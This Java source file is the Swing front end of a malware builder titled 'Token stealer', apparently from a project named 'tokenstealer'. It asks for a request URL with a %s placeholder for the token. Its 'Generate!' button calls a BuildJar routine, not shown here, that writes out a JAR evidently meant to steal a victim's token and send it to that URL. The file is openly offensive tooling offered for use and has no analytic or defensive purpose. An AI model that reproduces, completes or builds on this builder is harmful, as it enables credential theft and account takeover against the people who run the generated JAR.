package de.romjaki.tokenstealer.builder;

import javax.swing.*;
import java.awt.*;
import java.io.File;

public class Builder extends JFrame {
    public static final String PLACEHOLDER_HINT = "Use %s as placeholder for the token";
    public static final String COPYRIGHT = "COPYRIGHT: MAINZ DAZ IS!";
    private JTextField requestField;
    private JPanel requestPanel;
    private JLabel requestLabel;
    private JButton generateButton;

    public Builder() {
        super("Token stealer");
        setLayout(new GridLayout(0, 1));
        add(generateRequestField());
        add(generateGenerateButton());
        pack();
    }

    private Component generateGenerateButton() {
        generateButton = new JButton("Generate!");
        generateButton.setToolTipText(COPYRIGHT);
        generateButton.addActionListener(ignored -> BuildJar.buildJar(requestField.getText(), showSaveDialog()));
        return generateButton;
    }

    private File showSaveDialog() {
        JFileChooser chooser = new JFileChooser();
        switch (chooser.showSaveDialog(this)) {
            case JFileChooser.APPROVE_OPTION:
                return chooser.getSelectedFile();
            case JFileChooser.CANCEL_OPTION:
            case JFileChooser.ERROR_OPTION:
            default:
                return null;
        }
    }

    private Component generateRequestField() {
        requestPanel = new JPanel(new GridLayout());
        requestLabel = new JLabel("Request url:");
        requestLabel.setToolTipText(PLACEHOLDER_HINT);
        requestField = new JTextField(40);
        requestField.setToolTipText(PLACEHOLDER_HINT);
        requestPanel.add(requestLabel);
        requestPanel.add(requestField);
        return requestPanel;
    }
}
